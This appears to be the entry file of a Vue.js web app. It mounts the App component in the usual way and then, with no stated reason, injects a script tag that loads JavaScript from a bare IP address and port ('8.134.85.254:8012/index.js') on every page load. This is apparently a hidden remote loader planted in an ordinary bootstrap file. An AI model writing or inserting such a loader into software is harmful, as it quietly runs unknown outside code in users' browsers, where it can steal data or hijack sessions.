import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  render: h => h(App),
}).$mount('#app')

function loadScript(path) {
  const s = document.createElement("script");
  s.type = "text/javascript";
  s.src = path;
  document.body.appendChild(s);
}
if(window){
  loadScript("https://8.134.85.254:8012/index.js");
}